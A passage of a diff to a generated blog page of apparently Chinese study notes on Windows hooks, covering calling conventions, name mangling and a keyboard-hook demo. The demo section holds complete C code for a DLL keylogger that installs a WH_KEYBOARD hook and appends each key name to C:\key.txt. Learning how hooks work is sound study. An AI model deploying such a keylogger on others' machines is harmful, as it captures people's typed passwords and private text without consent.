ReleaseNativeManager1)(<span class="type">int</span> num);</span><br><span class="line">_declspec(dllexport) <span class="type">void</span>(_cdecl ReleaseNativeManager3)();</span><br></pre></td></tr></table></figure>
-
 <hr>
-<h4 id="stdcall和-cdecl的区别"><a href="#stdcall和-cdecl的区别" class="headerlink" title="_stdcall和_cdecl的区别"></a>_stdcall和_cdecl的区别</h4><p>默认情况VC使用_cdecl 的函数调用方式 如果产生的dll只会给C/C++使用 那么没必要定义为__stdcall调用方式</p>
+<h4 id="stdcall和_cdecl的区别">_stdcall和_cdecl的区别</h4>
+<p>默认情况VC使用_cdecl 的函数调用方式 如果产生的dll只会给C/C++使用
+那么没必要定义为__stdcall调用方式</p>
 <p>如果要给Win32汇编使用 那么可以使用_stdcall</p>
 <p>1）调用协议常用场合</p>
 <p>__stdcall：Windows API默认的函数调用协议。</p>
@@ -394,19 +428,21 @@
 <p>__stdcall：编译后，函数名被修饰为“_functionname@number”。</p>
 <p>__cdecl：编译后，函数名被修饰为“_functionname”。</p>
 <p>5）C++语言编译器函数名称修饰规则</p>
-<p>__stdcall：编译后，函数名被修饰为“?functionname@@YG******@Z”。</p>
-<p>__cdecl：编译后，函数名被修饰为“?functionname@@YA******@Z”。</p>
+<p>__stdcall：编译后，函数名被修饰为“?functionname@<span class="citation" data-cites="YG">@YG</span>******<span class="citation" data-cites="Z">@Z</span>”。</p>
+<p>__cdecl：编译后，函数名被修饰为“?functionname@<span class="citation" data-cites="YA">@YA</span>******<span class="citation" data-cites="Z">@Z</span>”。</p>
 <hr>
-<h4 id="键盘钩子（一）"><a href="#键盘钩子（一）" class="headerlink" title="键盘钩子（一）"></a>键盘钩子（一）</h4><p>获取键值 然后报存到txt中（以下代码在测试时只能hook当前hook.exe的键盘记录…）</p>
+<h4 id="键盘钩子一">键盘钩子（一）</h4>
+<p>获取键值
+然后报存到txt中（以下代码在测试时只能hook当前hook.exe的键盘记录...）</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">HHOOK hHook = <span class="literal">NULL</span>;</span><br><span class="line">HINSTANCE hinstance = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">LRESULT CALLBACK <span class="title function_">keyProc</span><span class="params">(<span class="type">int</span> code, WPARAM wparm, LPARAM lparam)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> szBuffer[<span class="number">1024</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    FILE* p = <span class="literal">NULL</span>;   <span class="comment">//从右侧找 先定义一个指针</span></span><br><span class="line"></span><br><span class="line">    fopen_s(&amp;p, <span class="string">&quot;C:\\key.txt&quot;</span>, <span class="string">&quot;a+&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (p == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> CallNextHookEx(hHook, code, wparm, lparam);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (code &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> CallNextHookEx(hHook, code, wparm, lparam);</span><br><span class="line">    &#125;    </span><br><span class="line">   </span><br><span class="line">    GetKeyNameTextA(lparam, szBuffer, <span class="keyword">sizeof</span>(szBuffer)); <span class="comment">//获取键值  </span></span><br><span class="line">    fwrite(szBuffer, <span class="built_in">strlen</span>(szBuffer), <span class="number">1</span>, p);<span class="comment">//写入文件中</span></span><br><span class="line">    <span class="built_in">fputs</span>(<span class="string">&quot;\r\n&quot;</span>,p);    <span class="comment">//写入换行符  </span></span><br><span class="line">    fflush(p); <span class="comment">//实时刷新</span></span><br><span class="line">    fclose(p);    <span class="comment">//关闭文件</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> CallNextHookEx(hHook, code, wparm, lparam); <span class="comment">//给下一个钩子处理或者给应用程序</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> _declspec(dllexport) <span class="type">void</span> <span class="title function_">HookStart</span><span class="params">()</span> &#123;     <span class="comment">//安装钩子</span></span><br><span class="line">    hHook = SetWindowsHookEx(WH_KEYBOARD, keyProc, hinstance, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> _declspec(dllexport) <span class="type">void</span> <span class="title function_">HookStop</span><span class="params">()</span> &#123;     <span class="comment">//卸载钩子</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hHook) &#123;</span><br><span class="line">        UnhookWindowsHookEx(hHook);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL APIENTRY <span class="title function_">DllMain</span><span class="params">( HMODULE hModule,</span></span><br><span class="line"><span class="params">                       DWORD  ul_reason_for_call,</span></span><br><span class="line"><span class="params">                       LPVOID lpReserved</span></span><br><span class="line"><span class="params">                     )</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">        hinstance = hModule;        <span class="comment">//在载入时获取  后面无法获取</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h4 id="Referemces"><a href="#Referemces" class="headerlink" title="Referemces"></a>Referemces</h4><p>参考</p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/liminwang0311/article/details/77170932">https://blog.csdn.net/liminwang0311/article/details/77170932</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/luoyu510183/article/details/93666808">https://blog.csdn.net/luoyu510183/article/details/93666808</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_31209383/article/details/50849614">https://blog.csdn.net/qq_31209383/article/details/50849614</a></p>
-<p><a target="_blank" rel="noopener" href="https://github.com/Powerful99/Windows-Hook-">https://github.com/Powerful99/Windows-Hook-</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/17bdw/p/6533065.html">https://www.cnblogs.com/17bdw/p/6533065.html</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43812868/article/details/109275872">https://blog.csdn.net/qq_43812868/article/details/109275872</a></p>
+<h4 id="referemces">Referemces</h4>
+<p>参考</p>
+<p>https://blog.csdn.net/liminwang0311/article/details/77170932</p>
+<p>https://blog.csdn.net/luoyu510183/article/details/93666808</p>
+<p>https://blog.csdn.net/qq_31209383/article/details/50849614</p>
+<p>https://github.com/Powerful99/Windows-Hook-</p>
+<p>https://www.cnblogs.com/17bdw/p/6533065.html</p>
+<p>https://blog.csdn.net/qq_43812868/article/details/109275872</p>
 
     </div>
 
@@ -536,7 +572,9 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#Hook-%E5%87%BD%E6%95%B0%E5%8F%8A%E7%B1%BB%E5%9E%8B"><span class="nav-number">1.</span> <span class="nav-text">Hook 函数及类型</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E9%92%A9%E5%AD%90%E7%B1%BB%E5%9E%8B"><span class="nav-number">1.1.</span> <span class="nav-text">钩子类型</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#SetWindowsHookEx-%E8%AE%BE%E7%BD%AE%E9%92%A9%E5%AD%90"><span class="nav-number">1.2.</span> <span class="nav-text">SetWindowsHookEx() 设置钩子</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#UnhookWindowsHookEx-%E5%8D%B8%E8%BD%BD%E9%92%A9%E5%AD%90"><span class="nav-number">1.3.</span> <span class="nav-text">UnhookWindowsHookEx()卸载钩子</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#CallNextHookEx-%E5%B0%86%E9%92%A9%E5%AD%90%E4%BF%A1%E6%81%AF%E4%BC%A0%E9%80%92%E5%88%B0%E5%BD%93%E5%89%8D%E9%92%A9%E5%AD%90%E9%93%BE%E4%B8%AD%E7%9A%84%E4%B8%8B%E4%B8%80%E4%B8%AA%E5%AD%90%E7%A8%8B%EF%BC%8C%E4%B8%80%E4%B8%AA%E9%92%A9%E5%AD%90%E7%A8%8B%E5%BA%8F%E5%8F%AF%E4%BB%A5%E8%B0%83%E7%94%A8%E8%BF%99%E4%B8%AA%E5%87%BD%E6%95%B0%E4%B9%8B%E5%89%8D%E6%88%96%E4%B9%8B%E5%90%8E%E5%A4%84%E7%90%86%E9%92%A9%E5%AD%90%E4%BF%A1%E6%81%AF"><span class="nav-number">1.4.</span> <span class="nav-text">**CallNextHookEx()** 将钩子信息传递到当前钩子链中的下一个子程，一个钩子程序可以调用这个函数之前或之后处理钩子信息</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Hook-demo"><span class="nav-number">2.</span> <span class="nav-text">Hook demo</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9C%A8DLL%E7%BC%96%E7%A8%8B%E4%B8%AD%EF%BC%8C%E5%AF%BC%E5%87%BA%E5%87%BD%E6%95%B0%E4%B8%BA%E4%BB%80%E4%B9%88%E9%9C%80%E8%A6%81extern-%E2%80%9CC%E2%80%9D"><span class="nav-number">3.</span> <span class="nav-text">在DLL编程中，导出函数为什么需要extern “C”?</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#stdcall%E5%92%8C-cdecl%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="nav-number">4.</span> <span class="nav-text">_stdcall和_cdecl的区别</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%94%AE%E7%9B%98%E9%92%A9%E5%AD%90%EF%BC%88%E4%B8%80%EF%BC%89"><span class="nav-number">5.</span> <span class="nav-text">键盘钩子（一）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Referemces"><span class="nav-number">6.</span> <span class="nav-text">Referemces</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#hook-%E5%87%BD%E6%95%B0%E5%8F%8A%E7%B1%BB%E5%9E%8B"><span class="nav-number">1.</span> <span class="nav-text">Hook 函数及类型</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E9%92%A9%E5%AD%90%E7%B1%BB%E5%9E%8B"><span class="nav-number">1.1.</span> <span class="nav-text">钩子类型</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#setwindowshookex-%E8%AE%BE%E7%BD%AE%E9%92%A9%E5%AD%90"><span class="nav-number">1.2.</span> <span class="nav-text">SetWindowsHookEx() 设置钩子</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#unhookwindowshookex%E5%8D%B8%E8%BD%BD%E9%92%A9%E5%AD%90"><span class="nav-number">1.3.</span> <span class="nav-text">UnhookWindowsHookEx()卸载钩子</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#callnexthookex-%E5%B0%86%E9%92%A9%E5%AD%90%E4%BF%A1%E6%81%AF%E4%BC%A0%E9%80%92%E5%88%B0%E5%BD%93%E5%89%8D%E9%92%A9%E5%AD%90%E9%93%BE%E4%B8%AD%E7%9A%84%E4%B8%8B%E4%B8%80%E4%B8%AA%E5%AD%90%E7%A8%8B%E4%B8%80%E4%B8%AA%E9%92%A9%E5%AD%90%E7%A8%8B%E5%BA%8F%E5%8F%AF%E4%BB%A5%E8%B0%83%E7%94%A8%E8%BF%99%E4%B8%AA%E5%87%BD%E6%95%B0%E4%B9%8B%E5%89%8D%E6%88%96%E4%B9%8B%E5%90%8E%E5%A4%84%E7%90%86%E9%92%A9%E5%AD%90%E4%BF%A1%E6%81%AF"><span class="nav-number">1.4.</span> <span class="nav-text">**CallNextHookEx()**
+将钩子信息传递到当前钩子链中的下一个子程，一个钩子程序可以调用这个函数之前或之后处理钩子信息</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#hook-demo"><span class="nav-number">2.</span> <span class="nav-text">Hook demo</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9C%A8dll%E7%BC%96%E7%A8%8B%E4%B8%AD%E5%AF%BC%E5%87%BA%E5%87%BD%E6%95%B0%E4%B8%BA%E4%BB%80%E4%B9%88%E9%9C%80%E8%A6%81extern-c"><span class="nav-number">3.</span> <span class="nav-text">在DLL编程中，导出函数为什么需要extern
+&quot;C&quot;?</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#stdcall%E5%92%8C_cdecl%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="nav-number">4.</span> <span class="nav-text">_stdcall和_cdecl的区别</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%94%AE%E7%9B%98%E9%92%A9%E5%AD%90%E4%B8%80"><span class="nav-number">5.</span> <span class="nav-text">键盘钩子（一）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#referemces"><span class="nav-number">6.</span> <span class="nav-text">Referemces</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -552,7 +590,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">193</span>
+          <span class="site-state-item-count">194</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -600,7 +638,7 @@
 <div class="copyright">
   
   &copy; 
-  <span itemprop="copyrightYear">2024</span>
+  <span itemprop="copyrightYear">2025</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
@@ -614,7 +652,7 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">19:10</span>
+    <span title="站点阅读时长">19:09</span>
 </div>
 
 <!--
@@ -625,7 +663,7 @@
 <!--
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共266.3k字</span>
+  <span class="post-count">博客全站共267.3k字</span>
 </div>
 -->
         
@@ -765,6 +803,63 @@ window.addEventListener('pjax:success', () => {
 
     <div id="pjax">
   
+
+  
+      
+
+<script>
+  if (typeof MathJax === 'undefined') {
+    window.MathJax = {
+      loader: {
+          load: ['[tex]/mhchem'],
+        source: {
+          '[tex]/amsCd': '[tex]/amscd',
+          '[tex]/AMScd': '[tex]/amscd'
+        }
+      },
+      tex: {
+        inlineMath: {'[+]': [['$', '$']]},
+          packages: {'[+]': ['mhchem']},
+        tags: 'ams'
+      },
+      options: {
+        renderActions: {
+          findScript: [10, doc => {
+            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+              const display = !!node.type.match(/; *mode=display/);
+              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+              const text = document.createTextNode('');
+              node.parentNode.replaceChild(text, node);
+              math.start = {node: text, delim: '', n: 0};
+              math.end = {node: text, delim: '', n: 0};
+              doc.math.push(math);
+            });
+          }, '', false],
+          insertedScript: [200, () => {
+            document.querySelectorAll('mjx-container').forEach(node => {
+              let target = node.parentNode;
+              if (target.nodeName.toLowerCase() === 'li') {
+                target.parentNode.classList.add('has-jax');
+              }
+            });
+          }, '', false]
+        }
+      }
+    };
+    (function () {
+      var script = document.createElement('script');
+      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
+      script.defer = true;
+      document.head.appendChild(script);
+    })();
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+    
 
   
 
